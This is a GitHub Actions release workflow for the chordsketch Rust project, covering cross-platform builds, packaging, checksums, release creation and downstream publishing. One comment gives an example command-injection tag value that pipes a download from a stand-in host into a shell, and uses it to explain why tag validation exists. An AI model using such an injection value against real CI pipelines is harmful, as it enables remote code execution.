name: Release

on:
  push:
    tags:
      - "v*"
  workflow_dispatch:
    inputs:
      tag:
        description: "Tag to build (e.g., v0.1.0)"
        required: true
        type: string

# Tag-triggered releases never receive force-pushes and MUST NOT be
# cancelled mid-flight (the partial-release failure mode described on
# the `build` job below would silently degrade downstream channels).
# Declare a concurrency group so the workflow is still covered by
# `.claude/rules/ci-parallelization.md` §5, but with
# `cancel-in-progress: false` so tag pushes and workflow_dispatch runs
# always run to completion.
concurrency:
  group: release-${{ inputs.tag || github.ref }}
  cancel-in-progress: false

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always

defaults:
  run:
    shell: bash

jobs:
  build:
    name: Build ${{ matrix.target }}
    runs-on: ${{ matrix.os }}
    # Intentionally fail-closed: if any build matrix cell fails, the
    # downstream `release` job (needs: build) is skipped and no GitHub
    # Release is created. This is correct because release.yml creates
    # the authoritative artifact set that every downstream channel
    # (Docker, VS Code, napi, post-release rollup) keys off. A partial
    # release with one missing archive would silently degrade every
    # install path for that platform; holding the release until all
    # cells pass is the safer failure mode. Contrast with
    # `vscode-extension.yml build-platform`, which ships a universal
    # VSIX so users on a failing platform still get a working extension
    # (see #1795). See #1806.
    strategy:
      fail-fast: false
      matrix:
        include:
          - target: x86_64-unknown-linux-gnu
            os: ubuntu-latest
          - target: aarch64-unknown-linux-gnu
            os: ubuntu-latest
            cross: true
          - target: x86_64-unknown-linux-musl
            os: ubuntu-latest
            cross: true
          - target: aarch64-unknown-linux-musl
            os: ubuntu-latest
            cross: true
          - target: x86_64-apple-darwin
            os: macos-latest
          - target: aarch64-apple-darwin
            os: macos-latest
          - target: x86_64-pc-windows-msvc
            os: windows-latest
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
        with:
          # Pin to the tag under release so `workflow_dispatch` runs
          # build from the tagged commit rather than whichever branch
          # HEAD the user selected as the dispatch ref. `push: tags:`
          # events already resolve GITHUB_SHA to the tagged commit,
          # so this `ref:` is a no-op on that path and a correctness
          # fix for manual re-runs (#2226).
          ref: ${{ inputs.tag || github.ref }}

      - name: Install Rust toolchain
        run: |
          rustup toolchain install stable --profile minimal
          rustup target add ${{ matrix.target }}

      - name: Install cross
        if: matrix.cross
        run: cargo install cross --locked

      # NOTE: no Swatinem/rust-cache here. Per .claude/rules/ci-parallelization.md §2,
      # this workflow fires on version-tag pushes (~every 10 days) and GitHub
      # Actions evicts cache entries after 7 days of inactivity, so the cache
      # expires between runs. Adding rust-cache delivers no wall-clock benefit
      # and only adds YAML noise. Do not add one back without updating the rule.

      - name: Build
        run: |
          if [ "${{ matrix.cross }}" = "true" ]; then
            cross build --release --target ${{ matrix.target }} -p chordsketch -p chordsketch-lsp
          else
            cargo build --release --target ${{ matrix.target }} -p chordsketch -p chordsketch-lsp
          fi
        shell: bash

      - name: Validate release tag
        # Route inputs.tag through env + format regex before any
        # downstream step interpolates the version into a shell body.
        # Without this, a `workflow_dispatch` tag like
        # `v1.0.0"; curl evil | sh; #` would break out of the
        # `echo "version=..."` shell quoting in "Determine version".
        # See #1797.
        uses: ./.github/actions/validate-release-tag
        with:
          tag: ${{ inputs.tag || github.ref_name }}

      - name: Determine version
        id: version
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_TAG: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            VERSION="$INPUT_TAG"
          else
            VERSION="$REF_NAME"
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
        shell: bash

      - name: Package (Unix)
        if: runner.os != 'Windows'
        env:
          VERSION: ${{ steps.version.outputs.version }}
          TARGET: ${{ matrix.target }}
        run: |
          ARCHIVE_NAME="chordsketch-${VERSION}-${TARGET}.tar.gz"
          STAGING="chordsketch-${VERSION}-${TARGET}"
          mkdir "$STAGING"
          cp "target/${TARGET}/release/chordsketch" "$STAGING/"
          cp "target/${TARGET}/release/chordsketch-lsp" "$STAGING/"
          cp LICENSE README.md "$STAGING/"
          tar czf "$ARCHIVE_NAME" "$STAGING"
          echo "ARCHIVE=$ARCHIVE_NAME" >> "$GITHUB_ENV"
        shell: bash

      - name: Package (Windows)
        if: runner.os == 'Windows'
        env:
          VERSION: ${{ steps.version.outputs.version }}
          TARGET: ${{ matrix.target }}
        run: |
          $ArchiveName = "chordsketch-$env:VERSION-$env:TARGET.zip"
          $Staging = "chordsketch-$env:VERSION-$env:TARGET"
          New-Item -ItemType Directory -Path $Staging
          Copy-Item "target/$env:TARGET/release/chordsketch.exe" "$Staging/"
          Copy-Item "target/$env:TARGET/release/chordsketch-lsp.exe" "$Staging/"
          Copy-Item LICENSE, README.md "$Staging/"
          Compress-Archive -Path "$Staging/*" -DestinationPath $ArchiveName
          echo "ARCHIVE=$ArchiveName" >> $env:GITHUB_ENV
        shell: pwsh

      - name: Upload artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: ${{ matrix.target }}
          path: ${{ env.ARCHIVE }}
          retention-days: 7

  release:
    name: Create Release
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: write
    if: startsWith(github.ref, 'refs/tags/v') || github.event_name == 'workflow_dispatch'
    # The contract every downstream reusable workflow is called with
    # (ADR-0040). `tag` is the v-prefixed release tag, already
    # format-validated by the `Validate release tag` step below; `version`
    # is the same value with the `v` stripped, for the npm-side callees
    # that set a package.json version. (The `build` job's own
    # `steps.version.outputs.version` predates this and holds the *tag* —
    # it names release archives, so it is left alone.)
    outputs:
      tag: ${{ steps.version.outputs.tag }}
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0

      - name: Download all artifacts
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          path: artifacts

      - name: Validate release tag
        # See rationale at the corresponding step in the `build` job.
        uses: ./.github/actions/validate-release-tag
        with:
          tag: ${{ inputs.tag || github.ref_name }}

      - name: Determine version
        id: version
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_TAG: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            TAG="$INPUT_TAG"
          else
            TAG="$REF_NAME"
          fi
          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
          echo "version=${TAG#v}" >> "$GITHUB_OUTPUT"
        shell: bash

      - name: Generate checksums
        run: |
          cd artifacts
          find . -type f \( -name "*.tar.gz" -o -name "*.zip" \) -exec sha256sum {} \; | sed 's|  \./[^/]*/|  |' > ../checksums.txt
          cat ../checksums.txt

      - name: Create Release
        env:
          # `GITHUB_TOKEN` is sufficient here. Publishing used to need a
          # PAT (ADR-0009) purely so the resulting `release: [published]`
          # event would cascade to the downstream workflows — GitHub
          # suppresses that event when the release is created by
          # `GITHUB_TOKEN`. ADR-0040 replaced the cascade with the
          # explicit fan-out below, so nothing keys off the event any
          # more and the PAT's only purpose is gone.
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAG: ${{ steps.version.outputs.tag }}
        run: |
          gh release create "$TAG" \
            --title "$TAG" \
            --notes "See [CHANGELOG.md](https://github.com/koedame/chordsketch/blob/main/CHANGELOG.md) for details." \
            artifacts/*/* \
            checksums.txt \
            --draft=false

  # --------------------------------------------------------------- fan-out
  #
  # Downstream publishing is an explicit call graph rooted at this workflow,
  # not a `release: [published]` broadcast (ADR-0040). Two properties the
  # broadcast could not provide:
  #
  #   1. Tag-namespace routing. This workflow's `push: tags: v*` trigger is
  #      filtered by GitHub itself, so a `desktop-v*` release (owned by
  #      desktop-release.yml) can no longer reach any of these workflows.
  #      The broadcast had no tag filter and fanned every release into all
  #      of them.
  #   2. Ordering. `needs: [release]` means the GitHub Release — and every
  #      asset the callees download from it — exists before they start.
  #
  # Each callee's `permissions:` below is the union of what its own jobs
  # declare: a called workflow can only narrow the caller job's token, so
  # under-granting here silently breaks a publish step.
  #
  # Every callee also keeps a `workflow_dispatch` entry point for
  # re-running one channel against an existing tag.

  docker:
    name: Docker
    needs: [release]
    permissions:
      contents: read
      packages: write
    uses: ./.github/workflows/docker.yml
    with:
      tag: ${{ needs.release.outputs.tag }}
      # Only a tag push publishes the newest release, so only a tag push
      # may move `:latest`. A `workflow_dispatch` re-run rebuilds an older
      # tag's immutable `:X.Y.Z` / `:X.Y` aliases without regressing
      # `:latest` (#1064) — this expression is what used to be spelled
      # `github.event_name == 'release'` inside docker.yml.
      promote-latest: ${{ github.event_name == 'push' }}
    secrets: inherit

  napi:
    name: napi-rs
    needs: [release]
    permissions:
      contents: write
    uses: ./.github/workflows/napi.yml
    with:
      tag: ${{ needs.release.outputs.tag }}
    secrets: inherit

  vscode-extension:
    name: VS Code Extension
    needs: [release]
    permissions:
      contents: read
    uses: ./.github/workflows/vscode-extension.yml
    with:
      tag: ${{ needs.release.outputs.tag }}
    secrets: inherit

  npm-wasm:
    name: Verify @chordsketch/wasm build
    needs: [release]
    permissions:
      contents: read
    uses: ./.github/workflows/npm-publish.yml
    with:
      version: ${{ needs.release.outputs.version }}
    secrets: inherit

  npm-tree-sitter:
    name: Verify tree-sitter-chordpro build
    needs: [release]
    permissions:
      contents: read
    uses: ./.github/workflows/npm-publish-tree-sitter.yml
    with:
      version: ${{ needs.release.outputs.version }}
    secrets: inherit

  post-release:
    name: Post-Release Package Updates
    needs: [release]
    permissions:
      contents: read
    uses: ./.github/workflows/post-release.yml
    with:
      tag: ${{ needs.release.outputs.tag }}
    secrets: inherit
